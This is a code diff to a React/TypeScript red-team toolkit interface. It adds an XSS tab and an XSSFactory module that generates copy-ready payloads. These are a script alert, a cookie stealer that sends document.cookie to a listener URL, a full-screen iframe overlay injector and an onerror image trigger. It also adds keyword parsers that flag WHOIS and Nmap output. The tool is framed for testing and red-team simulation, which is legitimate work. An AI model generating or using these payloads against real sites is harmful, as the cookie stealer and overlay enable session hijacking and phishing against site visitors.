@@ -17,6 +17,7 @@ export default function RedTeamToolkit() {
                             <TabsTrigger value="exploit"><Bug className="mr-2" /> Exploit</TabsTrigger>
                             <TabsTrigger value="payload"><KeyRound className="mr-2" /> Payloads</TabsTrigger>
                             <TabsTrigger value="console"><Terminal className="mr-2" /> Console</TabsTrigger>
+                            <TabsTrigger value="xss"><Bug className="mr-2" /> XSS Toolkit</TabsTrigger>
                         </TabsList>
 
                         <TabsContent value="recon">
@@ -32,28 +33,44 @@ export default function RedTeamToolkit() {
                                         alert(result);
                                     }}
                                 >Run Nmap Scan</Button>
+                        <TabsContent value="xss">
+                            <p className="text-sm">XSS payloads for testing and red team simulation:</p>
+                            <div className="mt-2 space-y-2">
+                                <Button variant="outline" className="w-full" onClick={() => {
+                                    const payload = XSSFactory.basicAlert("PWNED");
+                                    navigator.clipboard.writeText(payload);
+                                    alert("Basic alert payload copied!");
+                                }}>
+                                    Copy Basic Alert Payload
+                                </Button>
 
-                                <Button
-                                    variant="secondary"
-                                    className="w-full"
-                                    onClick={async () => {
-                                        const domain = prompt("Domain for DNS Lookup:");
-                                        if (!domain) return;
-                                        const result = await ReconModule.dnsLookup(domain);
-                                        alert(JSON.stringify(result, null, 2));
-                                    }}
-                                >Passive DNS Lookup</Button>
+                                <Button variant="outline" className="w-full" onClick={() => {
+                                    const url = prompt("Exfil URL (listener)?");
+                                    if (!url) return;
+                                    const payload = XSSFactory.cookieStealer(url);
+                                    navigator.clipboard.writeText(payload);
+                                    alert("Cookie stealer copied!");
+                                }}>
+                                    Copy Cookie Stealer
+                                </Button>
 
-                                <Button
-                                    variant="secondary"
-                                    className="w-full"
-                                    onClick={async () => {
-                                        const domain = prompt("Domain for WHOIS Lookup:");
-                                        if (!domain) return;
-                                        const result = await ReconModule.whoisLookup(domain);
-                                        alert(result);
-                                    }}
-                                >WHOIS & ASN Check</Button>
+                                <Button variant="outline" className="w-full" onClick={() => {
+                                    const src = prompt("Iframe URL?");
+                                    if (!src) return;
+                                    const payload = XSSFactory.iframeInjector(src);
+                                    navigator.clipboard.writeText(payload);
+                                    alert("Iframe injector copied!");
+                                }}>
+                                    Copy Iframe Injector
+                                </Button>
+
+                                <Button variant="outline" className="w-full" onClick={() => {
+                                    const payload = XSSFactory.eventDriven();
+                                    navigator.clipboard.writeText(payload);
+                                    alert("Event-driven XSS copied!");
+                                }}>
+                                    Copy OnError Event Trigger
+                                </Button>
                             </div>
                         </TabsContent>
 
@@ -65,7 +82,7 @@ export default function RedTeamToolkit() {
                                 <Button variant="destructive" className="w-full">Cross-Site Scripting (XSS)</Button>
                             </div>
                         </TabsContent>
-
+                        
                         <TabsContent value="payload">
                             <p className="text-sm">Payload generators (download, reverse shell, etc):</p>
                             <div className="mt-2 space-y-2">
@@ -142,4 +159,34 @@ export const ConsoleModule = {
             });
         });
     }
+};
+export const ThreatIntelParser = {
+    parseWhois: (whoisText: string) => {
+        const flags = [];
+        if (/namecheap/i.test(whoisText)) flags.push("Registrar: Namecheap (often abused)");
+        if (/cloudflare/i.test(whoisText)) flags.push("Behind Cloudflare (might be obfuscating origin IP)");
+        if (/recent/i.test(whoisText) || /\d{4}-\d{2}-\d{2}/.test(whoisText)) {
+            const yearMatch = whoisText.match(/\d{4}/g)?.map(Number).find(y => y > 2020);
+            if (yearMatch) flags.push(`Recently registered (${yearMatch})`);
+        }
+        return flags;
+    },
+
+    parseNmap: (nmapText: string) => {
+        const findings = [];
+        if (/smbv1/i.test(nmapText)) findings.push("SMBv1 service detected (vulnerable)");
+        if (/ftp.*anonymous/i.test(nmapText)) findings.push("FTP anonymous login enabled");
+        if (/open\s+http/i.test(nmapText)) findings.push("Open HTTP (unencrypted)");
+        if (/Apache\/2\.2|PHP\/5\./i.test(nmapText)) findings.push("Outdated Apache or PHP version");
+        return findings;
+    }
+};
+export const XSSFactory = {
+    basicAlert: (message = "XSS") => `<script>alert('${message}')</script>`,
+    cookieStealer: (url: string) =>
+        `<script>fetch('${url}?c='+document.cookie)</script>`,
+    iframeInjector: (src: string) =>
+        `<iframe src='${src}' style='position:absolute;width:100%;height:100%;top:0;left:0;z-index:9999;'></iframe>`,
+    eventDriven: () =>
+        `<img src="x" onerror="alert('XSS triggered!')" />`
 };
